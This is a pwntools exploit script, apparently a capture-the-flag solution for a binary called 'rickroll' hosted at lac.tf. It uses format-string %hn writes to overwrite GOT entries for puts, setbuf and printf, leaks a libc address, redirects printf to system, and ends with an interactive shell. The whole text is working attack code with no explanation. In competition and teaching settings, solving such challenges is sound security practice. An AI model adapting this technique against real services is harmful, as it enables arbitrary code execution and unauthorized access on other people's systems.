from pwn import *

libc = ELF("./libc.so.6")
elf = ELF("./rickroll")
# p = process("./rickroll")
p = remote("lac.tf", 31135)

puts_got = elf.got["puts"]
setbuf_got = elf.got["setbuf"]
printf_got = elf.got["printf"]
main_setbuf = 0x401196
main = 0x40119b
main_fgets = 0x4011ac

vals = []
accum = (main << 64) | main_setbuf
for _ in range(8):
    v = ((accum & 0xffff) - sum(vals)) & 0xffff
    if 0 < v < 8:
        v += 0x10000
    vals.append(v)
    accum >>= 16

pl = b""
for i in range(len(vals)):
    if vals[i] != 0:
        pl += f"%{vals[i]}x%{28+i}$hn".encode()
    else:
        pl += f"%{28+i}$hn".encode()
pl = pl.ljust(0x80, b"X")
pl += b"::%39$p//"
pl = pl.ljust(0xb0, b"X")
pl += b"".join((puts_got + 2 * i).to_bytes(8, "little") for i in range(4))
pl += b"".join((setbuf_got + 2 * i).to_bytes(8, "little") for i in range(4))
p.sendlineafter(b"Lyrics: ", pl)
p.recvuntil(b"::")
leek = int(p.recvuntil(b"//", drop=True).decode(), 16)

libc_base = leek - 0x23d0a
system = libc_base + libc.sym["system"]
print(hex(system))
vals = []
accum = (system << 64) | main_fgets
for _ in range(8):
    v = ((accum & 0xffff) - sum(vals)) & 0xffff
    if 0 < v < 8:
        v += 0x10000
    vals.append(v)
    accum >>= 16

pl = b""
for i in range(len(vals)):
    if vals[i] != 0:
        pl += f"%{vals[i]}x%{24+i}$hn".encode()
    else:
        pl += f"%{24+i}$hn".encode()
pl = pl.ljust(0x80, b"X")
pl += b"".join((puts_got + 2 * i).to_bytes(8, "little") for i in range(4))
pl += b"".join((printf_got + 2 * i).to_bytes(8, "little") for i in range(4))

p.sendlineafter(b"Lyrics: ", pl)
p.interactive()

